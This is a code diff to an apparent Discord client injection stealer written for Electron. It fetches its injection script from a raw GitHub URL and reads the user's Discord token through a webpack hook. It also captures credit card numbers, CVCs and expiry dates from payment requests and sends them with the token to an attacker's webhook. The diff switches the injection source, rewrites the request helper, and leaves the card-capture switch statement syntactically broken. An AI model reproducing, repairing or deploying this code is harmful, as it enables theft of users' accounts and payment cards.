@@ -12,8 +12,8 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/TurboKoT1/Multiverse-Core/main/injection.js",
+    webhook: "%WEBHOOK_URL%",
+    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -122,42 +122,30 @@ const clearAllUserData = () => {
 
 const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
 
-const request = (method, url, headers, data) => {
+const request = async (method, url, headers, data) => {
+    url = new URL(url);
+    const options = {
+        protocol: url.protocol,
+        hostname: url.host,
+        path: url.pathname,
+        method: method,
+        headers: {
+            "Access-Control-Allow-Origin": "*",
+        },
+    };
+
+    if (url.search) options.path += url.search;
+    for (const key in headers) options.headers[key] = headers[key];
+    const req = https.request(options);
+    if (data) req.write(data);
+    req.end();
+
     return new Promise((resolve, reject) => {
-        url = new URL(url);
-
-        const options = {
-            protocol: url.protocol,
-            hostname: url.hostname,
-            path: url.pathname + url.search,
-            method: method,
-            headers: {
-                "Access-Control-Allow-Origin": "*",
-                ...headers,
-            },
-        };
-
-        const req = https.request(options, (res) => {
-            let responseData = "";
-
-            res.on("data", (chunk) => {
-                responseData += chunk;
-            });
-
-            res.on("end", () => {
-                resolve(responseData);
-            });
+        req.on("response", res => {
+            let data = "";
+            res.on("data", chunk => data += chunk);
+            res.on("end", () => resolve(data));
         });
-
-        req.on("error", (err) => {
-            reject(err);
-        });
-
-        if (data) {
-            req.write(data);
-        }
-
-        req.end();
     });
 };
 
@@ -629,7 +617,7 @@ createWindow();
 session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
     if (![200, 202].includes(details.statusCode)) return;
     if (details.method != 'POST') return;
-    switch (true) {
+    switch (true)
         case details.url.endsWith('tokens'):
             const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
             CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
